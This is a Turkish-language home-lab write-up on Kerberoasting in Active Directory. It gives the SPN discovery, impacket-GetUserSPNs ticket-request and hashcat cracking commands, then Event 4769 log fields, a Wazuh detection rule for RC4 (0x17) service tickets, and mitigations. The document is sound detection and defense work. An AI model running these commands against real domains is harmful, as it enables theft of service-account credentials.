# Aşama 6 — Active Directory Saldırıları

> ⚠️ **Bridge uyarısı:** LLMNR/NBT-NS zehirleme (Responder) bridge modunda evdeki gerçek cihazları
> da etkileyebiliyor. Bu aşamayı ağın sakin olduğu bir zamanda, ağda başka kritik cihaz yokken
> çalıştırdım.



# Kerberoasting (T1558.003)

## 1. Amaç ve ortam

**Kerberoasting**, hiçbir yönetici yetkisi olmayan sıradan bir domain kullanıcısının, SPN'e sahip
bir **servis hesabının parolasını** ele geçirmesini sağlayan bir AD saldırısı.

**Zafiyetin kökü:** Active Directory'de SPN'i (Service Principal Name) olan her hesap için,
domaindeki **herhangi bir kimliği doğrulanmış kullanıcı** servis bileti (TGS) isteyebiliyor. Bu
bilet, hedef **servis hesabının parola özetiyle (NTLM hash)** şifreleniyor. Saldırgan bileti alıyor,
kendi makinesinde **çevrimdışı** kırıyor ve açık parolayı elde ediyor.

**Neden tehlikeli:** Saldırı DC'ye tek bir yanlış parola bile denemiyor  kırma işlemi saldırganın
kendi makinesinde oluyor. Bu yüzden brute-force gibi gürültü yapmıyor, **sessiz**. Servis hesabı
yüksek yetkiliyse (çoğu zaman öyle), tüm domain tehlikeye giriyor.

### Lab bileşenleri

| Rol | Değer |
|-----|-------|
| Hedef servis hesabı | `svc-sql` |
| SPN | `MSSQL/sql.lab.local:1433` |
| Ele geçmiş sıradan kullanıcı | `ahmet` |
| Domain Controller (DC01) | 192.168.1.75 |
| Saldırgan (Kali) | 192.168.1.105 |
| SIEM (Wazuh) | 192.168.1.95 |

---

## 2. Saldırı  kullandığım araç ve komutlar

### Adım 1  SPN keşfi
Roast edilebilir hesapları bulmak için SPN'leri listeledim:
```powershell
setspn -Q */*        # veya hedefe özel: setspn -L svc-sql
```
Çıktıyı doğruladım: `svc-sql → MSSQL/sql.lab.local:1433`.

### Adım 2  Servis bileti alma (hash çıkarma)
Kali'den, `ahmet` kimliğiyle:
```bash
impacket-GetUserSPNs 'lab.local/ahmet:<ahmet_parolasi>' -dc-ip 192.168.1.75 -request-user svc-sql
```
Çıktı (Kerberoast hash):
```
$krb5tgs$23$*svc-sql$LAB.LOCAL$lab.local/svc-sql*$...
```
`23` = etype 23 = **RC4**. impacket varsayılan olarak RC4 bilet istiyor, çünkü RC4 ile şifreli
biletlerin çevrimdışı kırılması AES'e göre çok daha kolay.

> **Takıldığım tuzak:** Parolada `*` gibi özel karakter varsa `kullanıcı:parola` kısmını **tek
> tırnak** içine almak gerekiyor (`'lab.local/ahmet:Aa123456789*'`). Aksi halde zsh `*` ve `<>`
> karakterlerini genişletip "no such file or directory" hatası veriyor  bunu bizzat yaşadım.

### Adım 3  Çevrimdışı kırma
```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```
- `-m 13100` = Kerberos 5 TGS-REP (etype 23) kırma modu.
- Parola zayıf olduğu için (`Password1`) **0 saniyede** kırıldı (14M kelimenin ~%0.03'ü).

**Kanıtladığım saldırı zinciri:**
```
ahmet (sıradan kullanıcı, admin yetkisi yok)
  → DC'den svc-sql için TGS istedi
  → RC4 ile şifreli hash'i aldı
  → kendi makinesinde çevrimdışı kırdı
  → svc-sql'in açık parolası ele geçti
```

---

## 3. Loglar

Saldırı, DC'de **Event ID 4769** ("Bir Kerberos hizmet anahtarı istendi") olayı üretiyor. Saldırıyı
normal trafikten ayıran alanlar:

| Alan | Normal bilet | Saldırı bileti |
|------|--------------|----------------|
| `serviceName` | krbtgt, bilgisayar hesapları (`...$`) | **svc-sql** (servis hesabı) |
| `ticketEncryptionType` | `0x12` / `0x11` (AES) | **`0x17`** (RC4) |
| `targetUserName` | bilgisayar hesapları | **ahmet** (kullanıcı) |
| `ipAddress` | `::1` (yerel) | **192.168.1.105** (Kali) |

> DC'nin kendi günlüğünde doğrulama (dil bağımsız, olay alanlarından):
> ```powershell
> Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4769} -MaxEvents 20 |
>   Select-Object TimeCreated,
>     @{N='User';E={$_.Properties[0].Value}},
>     @{N='Service';E={$_.Properties[2].Value}},
>     @{N='Enc';E={$_.Properties[5].Value}},
>     @{N='IP';E={$_.Properties[6].Value}} | Format-Table -AutoSize
> ```
> (PowerShell `Enc` sütununda onluk **23** gösteriyor; Wazuh onaltılık **0x17**  aynı değer.)

---

## 4. Tespit kuralı (Wazuh)

### Kök sorun
Wazuh'un **varsayılan kuralları başarılı (status 0x0) 4769 isteklerine alarm üretmiyor**  bunlar
çok yaygın olduğu için `windows_security` grubunda **level 0** (sessiz) tutuluyor. Yani saldırının
logu Wazuh'a *ulaşıyor* ama bir alarma *dönüşmüyor*. Tespit mühendisi olarak görevim, saldırının
imzasını (servis hesabı için RC4 bilet) bilip bu sessiz olayı yüksek seviyeli bir alarma çevirmek.

### Çalışan kural
`/var/ossec/etc/rules/local_rules.xml`:
```xml
<group name="windows,kerberos,attack,">
  <!-- Kerberoasting: bir servis hesabı için RC4 (0x17) şifreli TGS isteği.
       windows_security grubunun alt kuralı olarak her Security olayında değerlendirilir. -->
  <rule id="100300" level="12">
    <if_group>windows_security</if_group>
    <field name="win.system.eventID">^4769$</field>
    <field name="win.eventdata.ticketEncryptionType">^0x17$</field>
    <description>Kerberoasting suphesi: RC4 (0x17) sifreli servis bileti istendi (T1558.003). Hedef servis: $(win.eventdata.serviceName), kaynak IP: $(win.eventdata.ipAddress)</description>
    <mitre>
      <id>T1558.003</id>
    </mitre>
  </rule>
</group>
```

### Kuralı parça parça (100300)
| Satır | Ne yapar |
|-------|----------|
| `<if_group>windows_security</if_group>` | Her Windows Security olayının **alt dalında** değerlendir (çözümleme sırası: olay önce temel kurala düşer, sonra buraya) |
| `<field name="win.system.eventID">^4769$</field>` | Sadece **Event 4769** (TGS/servis bileti isteği); `^4769$` = tam eşleşme (47690 gibi başka id'lere kaymaz) |
| `<field name="win.eventdata.ticketEncryptionType">^0x17$</field>` | Bilet **RC4 (0x17)** ile şifreli → Kerberoasting'in imzası (normal trafik AES 0x11/0x12 kullanır) |
| `<description>... $(win.eventdata.serviceName) ... $(win.eventdata.ipAddress)</description>` | **Dinamik enterpolasyon:** `$(alan)` alarm metnine o olayın **canlı değerini** basar (hedef servis + kaynak IP) → tek bakışta bağlamı görüyorum |
| `<mitre><id>T1558.003</id></mitre>` | ATT&CK eşlemesi (Kerberoasting) |

> **İki `field` = VE mantığı:** Bir kuraldaki birden çok `<field>`'in **hepsi** eşleşmeli. Yani
> "Event 4769 **ve** şifreleme 0x17"  ikisi birden olmazsa alarm düşmez. Tek başına çok yaygın
> olan 4769'u, "RC4 ile" koşulu daraltıp saldırıya özgü hale getiriyor.

**Neden `if_group` (ve neden `decoded_as` değil):** İlk denediğim `decoded_as windows_eventchannel`
kuralı, Wazuh'un temel kural ağacıyla *yarışıp kaybediyordu* (atomik sibling olarak öncelik
alamıyordu). `if_group windows_security` ile kural, her Security olayını süzen temel kuralın **alt
dalına** giriyor ve öncelik kazanıyor.

### Doğrulama (ürettiğim alarm)
```
rule.id:              100300
rule.level:           12
rule.description:     Kerberoasting suphesi: RC4 (0x17) sifreli servis bileti istendi (T1558.003). Hedef servis: svc-sql, kaynak IP: ::ffff:192.168.1.105
rule.mitre.technique: Kerberoasting (T1558.003  Credential Access)
agent.name:           DC01
eventID:              4769 (Kerberos servis bileti isteği)
serviceName:          svc-sql
ticketEncryptionType: 0x17 (RC4  saldırı imzası; normal trafik 0x12/AES)
targetUserName:       ahmet@LAB.LOCAL
ipAddress:            ::ffff:192.168.1.105 (Kali  saldırgan)
```

### Yanlış pozitif (FP) notu
RC4, bazı eski/legacy uygulamalarda meşru da olabiliyor. Üretimde:
- Bilinen legacy servisleri kuraldan hariç tutarım, **veya**
- **Frekans korelasyonu** eklerim: aynı kaynaktan kısa sürede çok sayıda farklı SPN için bilet
  istenmesi, tek bir RC4 isteğinden çok daha güçlü (ve daha az FP'li) bir sinyal.

---

## 5. MITRE ATT&CK

| | |
|---|---|
| Teknik | **T1558.003  Kerberoasting** |
| Taktik | **Credential Access** |
| Tespit kaynağı | Windows Security log, Event ID 4769 |

---

## 6. Önlem

1. **Güçlü ve uzun servis hesabı parolası (25+ karakter).** `Password1` 0 saniyede kırıldı; 25+
   rastgele karakter çevrimdışı kırmayı pratikte imkânsız yapar.
2. **gMSA (Group Managed Service Accounts).** Windows'un otomatik üretip 30 günde bir döndürdüğü
   120 karakterlik parolalar — en güçlü yapısal çözüm.
3. **RC4'ü kapat, AES'i zorla.** Servis hesabında `msDS-SupportedEncryptionTypes` ile yalnızca
   AES'e izin ver → saldırgan 0x17 bileti alamaz.
4. **En az yetki.** Servis hesabı asla Domain Admin olmasın; ele geçse bile hasar sınırlı kalır.
5. **Tespit.** Kurduğum 4769 + RC4 kuralı + honeypot SPN (kimsenin kullanmadığı sahte bir servis
   hesabı — ona gelen her bilet isteği %100 saldırıdır).

---

## 7. Karşılaştığım sorunlar ve çözümleri (tespit debug günlüğü)

Alarm ilk denemelerde düşmedi; tahminle değil, **uçtan uca zinciri doğrulayarak** çözdüm. Bu sıra,
bir tespit kuralı tetiklenmediğinde izlediğim standart yol:

| # | Kontrol | Nasıl | Sonuç |
|---|---------|-------|-------|
| 1 | **Üretim**  olay kaynakta var mı? | DC'de `Get-WinEvent ... Id=4769` | ✅ svc-sql / 0x17 / Kali IP mevcut |
| 2 | **Denetim** audit açık mı? | `auditpol /get /subcategory:"{0CCE9240-69AE-11D9-BED3-505054503030}"` | ✅ "Success and Failure" |
| 3 | **İletim**  ajan eliyor mu? | DC `ossec.conf` → Security `<query>` | ✅ 4769 filtrede yok, gönderiliyor |
| 4 | **Ulaşım/ajan**  ajan aktif mi? | Wazuh `agent.name:DC01` | ✅ Aktif, log akıyor |
| 5 | **Eşleşme**  kural doğru ağaçta mı? | `decoded_as` → ✗, `if_group` → ✅ | Kuralı `if_group`'la düzelttim |

**Diğer takıldığım tuzaklar:**
- zsh'te özel karakterli parola → **tek tırnak** (`'...*'`).
- PowerShell'de GUID `{...}` süslü parantezi kod bloğu sanıyor → **çift tırnakla** sardım.
- `wazuh-logtest`'e elle yapıştırdığım JSON, `windows_eventchannel` değil `json` çözücüsüyle
  işleniyor → gerçek ajan formatını taklit etmiyor, bu yolla kural testi yanıltıcı oluyor.

---

## 8. Ekran görüntüleri

**Kerberos denetim alt kategorisi açık (4769 üretimi için ön koşul):**

![Gelişmiş denetim ilkesi - Kerberos](gorseller/06-auditpol.png)


